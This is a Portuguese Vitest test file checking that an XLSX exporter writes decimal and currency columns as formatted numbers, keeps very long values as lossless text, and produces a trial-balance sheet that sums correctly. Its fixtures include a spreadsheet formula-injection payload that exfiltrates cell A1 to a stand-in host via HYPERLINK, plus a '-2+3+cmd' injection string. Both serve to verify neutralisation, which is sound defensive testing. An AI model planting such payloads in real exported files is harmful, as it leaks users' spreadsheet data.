/**
 * ORÁCULO — XLSX grava decimais como número (issue #300, nó D:xlsx-decimais-300).
 *
 * Escrito pelo VERIFICADOR antes da correcção. NUNCA `vitest -u`; um agente de
 * implementação que altere este ficheiro é BLOCKER.
 *
 * Contrato (decisão do orquestrador + critério de aceitação da #300):
 *  - em `toXlsx`, células de colunas `decimal`/`currency` com ≤ 15 dígitos
 *    significativos são escritas como NÚMERO (`t: 'n'`) com o formato `#,##0.00`;
 *    o número escrito é exactamente o do `Decimal` (`String(v) === d.toString()`),
 *    e a conversão só acontece na escrita (o `Dataset` continua a levar `Decimal`);
 *  - acima de 15 dígitos significativos ficam TEXTO lossless (`Decimal.toString()`),
 *    nunca um número arredondado (recusar > número errado);
 *  - célula decimal vazia (`null`/`undefined`) não vira `0`;
 *  - colunas `text` continuam texto, mesmo quando parecem números ou fórmulas —
 *    a neutralização do #294 (nada de fórmula numa célula de texto) mantém-se;
 *  - `integer` continua número; `date` continua texto ISO; metadados intactos;
 *  - prova de ponta: as colunas decimais do balancete (#285) somam no SheetJS.
 */
import { describe, expect, it } from 'vitest';
import * as XLSX from 'xlsx';
import { Prisma } from '@prisma/client';
import { toXlsx } from '../xlsx';
import type { Dataset } from '../dataset';
import { datasetBalancete } from '@/lib/balancete-params';
import type { LinhaHierarquica, TotaisBV, ContaBV } from '@/server/services/financas/balancete-verificacao';

const D = (v: string) => new Prisma.Decimal(v);
const FORMATO = '#,##0.00';

function ler(ds: Dataset): XLSX.WorkSheet {
  const wb = XLSX.read(toXlsx(ds), { type: 'array', cellNF: true });
  return wb.Sheets[wb.SheetNames[0]!]!;
}

function cel(ws: XLSX.WorkSheet, ref: string): XLSX.CellObject | undefined {
  return ws[ref] as XLSX.CellObject | undefined;
}

/** Afirma que a célula é número com o valor exacto do Decimal e o formato de 2 casas. */
function numerica(ws: XLSX.WorkSheet, ref: string, decimal: string) {
  const c = cel(ws, ref);
  expect(c, `célula ${ref} existe`).toBeDefined();
  expect(c!.t, `célula ${ref} é número`).toBe('n');
  expect(typeof c!.v).toBe('number');
  expect(String(c!.v)).toBe(D(decimal).toString());
  expect(c!.z, `célula ${ref} tem formato ${FORMATO}`).toBe(FORMATO);
}

// ---------------------------------------------------------------------------
// Dataset genérico: A=texto, B=integer, C=currency, D=decimal, E=date
// ---------------------------------------------------------------------------

const COLUNAS: Dataset['colunas'] = [
  { key: 'ref', header: 'Referência', type: 'text' },
  { key: 'qtd', header: 'Quantidade', type: 'integer' },
  { key: 'total', header: 'Total (MZN)', type: 'currency' },
  { key: 'taxa', header: 'Taxa', type: 'decimal' },
  { key: 'data', header: 'Data', type: 'date' },
];

const LINHAS: Dataset['linhas'] = [
  // linha 2
  { ref: 'FT/2026/000001', qtd: 3, total: D('1234.56'), taxa: D('0.160000'), data: new Date('2026-07-20T10:00:00Z') },
  // linha 3: negativo legítimo
  { ref: 'NC/2026/000001', qtd: 1, total: D('-603500.00'), taxa: D('0.16'), data: new Date('2026-07-21T00:00:00Z') },
  // linha 4: exactamente 15 dígitos significativos
  { ref: '111', qtd: 2, total: D('9999999999999.99'), taxa: D('0.1'), data: new Date('2026-07-22T00:00:00Z') },
  // linha 5: 16 dígitos significativos → texto
  { ref: '7.1.1', qtd: 4, total: D('99999999999999.99'), taxa: D('0.05'), data: new Date('2026-07-23T00:00:00Z') },
  // linha 6: 18 dígitos (além de Number.MAX_SAFE_INTEGER) → texto
  { ref: '=HYPERLINK("http://mal.example/?x="&A1;"clique")', qtd: 5, total: D('9007199254740993.01'), taxa: null, data: null },
  // linha 7: number JS em coluna currency e decimal vazio (undefined)
  { ref: '-2+3+cmd', qtd: 6, total: 250.5, taxa: undefined, data: null },
];

const DS: Dataset = { nome: 'xlsx-decimais-300', colunas: COLUNAS, linhas: LINHAS };

describe('toXlsx — decimais como número (#300)', () => {
  const ws = ler(DS);

  it('currency e decimal com ≤ 15 dígitos significativos saem número com formato #,##0.00', () => {
    numerica(ws, 'C2', '1234.56');
    numerica(ws, 'D2', '0.160000');
    numerica(ws, 'D3', '0.16');
    numerica(ws, 'D4', '0.1');
    numerica(ws, 'D5', '0.05');
  });

  it('negativo legítimo em coluna decimal é número negativo, não texto', () => {
    numerica(ws, 'C3', '-603500.00');
    expect(cel(ws, 'C3')!.v).toBe(-603500);
  });

  it('exactamente 15 dígitos significativos ainda é número e não perde cêntimos', () => {
    numerica(ws, 'C4', '9999999999999.99');
  });

  it('acima de 15 dígitos significativos fica texto lossless (nunca número arredondado)', () => {
    const c5 = cel(ws, 'C5')!;
    expect(c5.t).toBe('s');
    expect(c5.v).toBe('99999999999999.99');
    const c6 = cel(ws, 'C6')!;
    expect(c6.t).toBe('s');
    expect(c6.v).toBe('9007199254740993.01');
  });

  it('um number JS numa coluna currency também sai número formatado', () => {
    numerica(ws, 'C7', '250.5');
  });

  it('decimal vazio (null/undefined) não vira 0', () => {
    for (const ref of ['D6', 'D7']) {
      const c = cel(ws, ref);
      if (c !== undefined) {
        expect(c.t, `${ref} não é número`).not.toBe('n');
        expect(c.v ?? '').toBe('');
      }
    }
  });

  it('a soma das células numéricas da coluna bate ao cêntimo com a soma em Decimal', () => {
    const refs = ['C2', 'C3', 'C4', 'C7'];
    const soma = refs.reduce((acc, r) => {
      const c = cel(ws, r)!;
      expect(c.t).toBe('n');
      return acc + (c.v as number);
    }, 0);
    const esperado = ['1234.56', '-603500.00', '9999999999999.99', '250.5']
      .reduce((a, v) => a.plus(D(v)), D('0'));
    expect(soma.toFixed(2)).toBe(esperado.toFixed(2));
  });

  it('o Dataset não é alterado: continua a levar o Decimal original (converte só na escrita)', () => {
    expect(Prisma.Decimal.isDecimal(LINHAS[0]!.total)).toBe(true);
    expect((LINHAS[0]!.total as Prisma.Decimal).toString()).toBe('1234.56');
  });

  it('colunas de texto continuam texto, mesmo com aspecto de número', () => {
    for (const [ref, v] of [['A2', 'FT/2026/000001'], ['A4', '111'], ['A5', '7.1.1']] as const) {
      const c = cel(ws, ref)!;
      expect(c.t, `${ref} é texto`).toBe('s');
      expect(c.v).toBe(v);
    }
  });

  it('neutralização do #294: texto começado por = ou - não vira fórmula nem número', () => {
    const a6 = cel(ws, 'A6')!;
    expect(a6.t).toBe('s');
    expect(a6.f).toBeUndefined();
    expect(a6.v).toBe('=HYPERLINK("http://mal.example/?x="&A1;"clique")');
    const a7 = cel(ws, 'A7')!;
    expect(a7.t).toBe('s');
    expect(a7.f).toBeUndefined();
    expect(a7.v).toBe('-2+3+cmd');
  });

  it('integer continua número e date continua texto ISO; cabeçalho é texto', () => {
    expect(cel(ws, 'B2')!.t).toBe('n');
    expect(cel(ws, 'B2')!.v).toBe(3);
    expect(cel(ws, 'E2')!.t).toBe('s');
    expect(cel(ws, 'E2')!.v).toBe('2026-07-20');
    expect(cel(ws, 'C1')!.t).toBe('s');
    expect(cel(ws, 'C1')!.v).toBe('Total (MZN)');
  });

  it('metadados ficam texto e deslocam as linhas sem mudar o tipo das células', () => {
    const comMeta = ler({ ...DS, meta: [['Exercício', '2026'], ['Valor', '1234.56']] });
    expect(cel(comMeta, 'B1')!.t).toBe('s');
    expect(cel(comMeta, 'B2')!.t).toBe('s');
    expect(cel(comMeta, 'B2')!.v).toBe('1234.56');
    // meta (2) + linha vazia (1) + cabeçalho (1) → 1.ª linha de dados é a 5
    numerica(comMeta, 'C5', '1234.56');
  });
});

// ---------------------------------------------------------------------------
// Ponta a ponta do balancete (#285): célula numérica que soma no SheetJS
// ---------------------------------------------------------------------------

function conta(id: string, codigo: string, nome: string, nivel: number): ContaBV {
  return { id, codigo, nome, classe: 'CLASSE_1', natureza: 'DEVEDORA', nivel, contaMaeId: null, aceitaLancamento: true };
}

function linha(c: ContaBV, movD: string, movC: string, sD: string, sC: string): LinhaHierarquica {
  return {
    tipo: 'CONTA',
    conta: c,
    implicita: false,
    movD: D(movD),
    movC: D(movC),
    acumD: D(movD),
    acumC: D(movC),
    saldoDevedor: D(sD),
    saldoCredor: D(sC),
    contraNatureza: false,
    nivel: c.nivel,
    agregadora: false,
    classe: c.classe,
    maeMostradaId: null,
    profundidade: c.nivel - 1,
  };
}

describe('balancete exportado em XLSX — colunas decimais somáveis (#300)', () => {
  const linhas = [
    linha(conta('c-111', '111', 'Caixa sede', 3), '12345.67', '0.10', '12345.57', '0'),
    linha(conta('c-121', '121', 'Banco', 3), '1012345.67', '0.20', '1012345.47', '0'),
    linha(conta('c-122', '122', 'Banco 2', 3), '0.30', '500.25', '0', '499.95'),
  ];
  const totais: TotaisBV = {
    movD: D('1024691.64'),
    movC: D('500.55'),
    acumD: D('1024691.64'),
    acumC: D('500.55'),
    saldoDevedor: D('1024691.04'),
    saldoCredor: D('499.95'),
  };
  const ds = datasetBalancete(
    { totais, linhas },
    'AMBOS',
    { exercicio: '2026', periodoInicial: 1, periodoFinal: 12, incluir13: false },
  );
  const ws = ler(ds);
  const aoa = XLSX.utils.sheet_to_json<unknown[]>(ws, { header: 1, raw: true, defval: null });
  const iCab = aoa.findIndex((l) => Array.isArray(l) && l.includes('Movimento Débito'));
  const cab = aoa[iCab] as unknown[];

  it('encontra o cabeçalho do balancete', () => {
    expect(iCab).toBeGreaterThanOrEqual(0);
  });

  it.each([
    ['Movimento Débito', ['12345.67', '1012345.67', '0.30']],
    ['Movimento Crédito', ['0.10', '0.20', '500.25']],
    ['Saldo Devedor', ['12345.57', '1012345.47', '0']],
  ] as const)('coluna «%s»: células das contas são número e somam no SheetJS', (header, valores) => {
    const j = cab.indexOf(header);
    expect(j).toBeGreaterThanOrEqual(0);
    const celulas = valores.map((_, k) => {
      const ref = XLSX.utils.encode_cell({ r: iCab + 1 + k, c: j });
      const c = cel(ws, ref)!;
      expect(c.t, `${header} linha ${k} é número`).toBe('n');
      expect(c.z).toBe(FORMATO);
      return c.v as number;
    });
    const soma = celulas.reduce((a, v) => a + v, 0);
    const esperado = valores.reduce((a, v) => a.plus(D(v)), D('0'));
    expect(soma.toFixed(2)).toBe(esperado.toFixed(2));
  });

  it('as colunas Conta e Descrição continuam texto (código «111» não vira número)', () => {
    const j = cab.indexOf('Conta');
    const c = cel(ws, XLSX.utils.encode_cell({ r: iCab + 1, c: j }))!;
    expect(c.t).toBe('s');
    expect(c.v).toBe('111');
  });
});
